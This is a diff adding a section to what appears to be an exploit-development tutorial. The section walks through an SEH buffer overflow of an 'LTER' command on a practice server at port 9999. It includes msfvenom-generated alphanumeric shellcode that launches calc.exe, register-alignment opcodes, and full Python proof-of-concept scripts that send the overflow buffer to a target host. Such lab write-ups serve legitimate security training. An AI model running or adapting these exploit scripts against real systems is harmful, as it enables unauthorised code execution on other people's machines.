@@ -347,3 +347,154 @@ s.close()
 ##### The alignment seems to have done its work as intended.
 
 ![](/assets/img/LTER/12.png)
+
+##### The next step is pointing ESI to the shellcode, to do this, alphanumeric shellcode using the ESI register is generated, and the value of EBX is pushed into the stack and popped into EAX, in order to make the calculations smaller.
+
+```term
+root@whitecr0wz:~/Exploit-Dev/LTER# msfvenom -p windows/exec CMD=calc.exe -f py -e x86/alpha_mixed BufferRegister=ESI EXITFUNC=thread 
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/alpha_mixed
+x86/alpha_mixed succeeded with size 440 (iteration=0)
+x86/alpha_mixed chosen with final size 440
+Payload size: 440 bytes
+Final size of py file: 2145 bytes
+buf =  b""
+buf += b"\x56\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
+buf += b"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
+buf += b"\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
+buf += b"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
+buf += b"\x49\x6c\x38\x68\x6c\x42\x37\x70\x43\x30\x33\x30\x63"
+buf += b"\x50\x4f\x79\x48\x65\x75\x61\x4f\x30\x31\x74\x6e\x6b"
+buf += b"\x36\x30\x76\x50\x6c\x4b\x31\x42\x54\x4c\x6c\x4b\x62"
+buf += b"\x72\x64\x54\x4e\x6b\x54\x32\x37\x58\x44\x4f\x6e\x57"
+buf += b"\x73\x7a\x47\x56\x70\x31\x79\x6f\x6e\x4c\x55\x6c\x71"
+buf += b"\x71\x73\x4c\x75\x52\x44\x6c\x65\x70\x6f\x31\x48\x4f"
+buf += b"\x54\x4d\x33\x31\x6a\x67\x49\x72\x39\x62\x30\x52\x31"
+buf += b"\x47\x6e\x6b\x76\x32\x36\x70\x4c\x4b\x73\x7a\x77\x4c"
+buf += b"\x6e\x6b\x30\x4c\x77\x61\x30\x78\x4a\x43\x43\x78\x37"
+buf += b"\x71\x78\x51\x66\x31\x6c\x4b\x42\x79\x31\x30\x45\x51"
+buf += b"\x5a\x73\x4c\x4b\x70\x49\x66\x78\x6b\x53\x46\x5a\x31"
+buf += b"\x59\x6c\x4b\x56\x54\x4e\x6b\x35\x51\x79\x46\x64\x71"
+buf += b"\x4b\x4f\x6e\x4c\x7a\x61\x5a\x6f\x46\x6d\x56\x61\x78"
+buf += b"\x47\x67\x48\x49\x70\x73\x45\x4a\x56\x44\x43\x73\x4d"
+buf += b"\x7a\x58\x77\x4b\x43\x4d\x65\x74\x31\x65\x68\x64\x72"
+buf += b"\x78\x6c\x4b\x31\x48\x34\x64\x73\x31\x5a\x73\x75\x36"
+buf += b"\x4c\x4b\x76\x6c\x50\x4b\x6e\x6b\x76\x38\x77\x6c\x76"
+buf += b"\x61\x5a\x73\x6c\x4b\x74\x44\x4e\x6b\x35\x51\x6a\x70"
+buf += b"\x4c\x49\x37\x34\x47\x54\x64\x64\x43\x6b\x51\x4b\x65"
+buf += b"\x31\x76\x39\x70\x5a\x33\x61\x49\x6f\x4d\x30\x53\x6f"
+buf += b"\x33\x6f\x43\x6a\x6c\x4b\x65\x42\x48\x6b\x4c\x4d\x71"
+buf += b"\x4d\x31\x7a\x75\x51\x6e\x6d\x6b\x35\x48\x32\x63\x30"
+buf += b"\x67\x70\x33\x30\x30\x50\x55\x38\x45\x61\x6e\x6b\x52"
+buf += b"\x4f\x6f\x77\x4b\x4f\x4e\x35\x6f\x4b\x6d\x30\x47\x6d"
+buf += b"\x44\x6a\x66\x6a\x31\x78\x4c\x66\x4e\x75\x4f\x4d\x6f"
+buf += b"\x6d\x4b\x4f\x68\x55\x67\x4c\x33\x36\x71\x6c\x77\x7a"
+buf += b"\x6b\x30\x69\x6b\x59\x70\x30\x75\x73\x35\x4d\x6b\x72"
+buf += b"\x67\x57\x63\x53\x42\x52\x4f\x63\x5a\x53\x30\x36\x33"
+buf += b"\x59\x6f\x58\x55\x53\x53\x70\x61\x42\x4c\x70\x63\x46"
+buf += b"\x4e\x72\x45\x32\x58\x65\x35\x53\x30\x41\x41"
+```
+
+```term
+nasm > PUSH EBX
+00000000  53                push ebx
+nasm > POP EAX
+00000000  58                pop eax 
+```
+
+###### PoC code:
+
+```term
+import socket, sys, struct
+
+[shellcode]
+
+alignment = ""
+alignment += "\x54\x58\x54\x5B"
+alignment += "\x66\x05\x58\x13"
+alignment += "\x50\x5C"
+alignment += "\x53\x58"
+
+nseh = struct.pack("<I", 0x06710870)
+seh = struct.pack("<I", 0x6250195E)
+
+buffer = "LTER /.:/" + "A" * 3 + buf + "A" * (3515  - 3 - len(buf)) + nseh + seh + "A" * 2 + alignment + "A" * 200
+
+host = sys.argv[1]
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+s.connect((host, 9999))
+
+s.send(buffer)
+
+s.close()
+```
+
+##### Once this is sent, it can be seen near the start of our buffer.
+
+![](/assets/img/LTER/13.png)
+
+##### The following step is to make EAX point to the shellcode, so it can be inserted in ESI later on.
+
+##### Calculating the address of the start of the shellcode against the value of EAX.
+
+```term
+root@whitecr0wz:~/Exploit-Dev/LTER# hexcalc 0x0185F20C 0x0185ECA4 
+0x568
+root@whitecr0wz:~/Exploit-Dev/LTER# 
+```
+
+##### Getting the values for the calculation.
+
+```term
+nasm > add ax, 0x568  
+00000000  66056805          add ax,0x568
+nasm > 
+```
+
+##### The opcodes required for PUSH EAX, POP ESI.
+
+```term
+nasm > PUSH EAX 
+00000000  50                push eax
+nasm > POP ESI
+00000000  5E                pop esi 
+```
+
+###### PoC code:
+
+```term
+import socket, sys, struct
+
+[shellcode]
+
+alignment = ""
+alignment += "\x54\x58\x54\x5B"
+alignment += "\x66\x05\x58\x13"
+alignment += "\x50\x5C"
+alignment += "\x53\x58"
+alignment += "\x66\x05\x68\x05"
+alignment += "\x50\x5E"
+
+nseh = struct.pack("<I", 0x06710870)
+seh = struct.pack("<I", 0x6250195E)
+
+buffer = "LTER /.:/" + "A" * 3 + buf + "A" * (3515  - 3 - len(buf)) + nseh + seh + "A" * 2 + alignment + "A" * 200
+
+host = sys.argv[1]
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+s.connect((host, 9999))
+
+s.send(buffer)
+
+s.close()
+```
+
+##### ESI is now pointing into the shellcode!
+
+![](/assets/img/LTER/14.png)
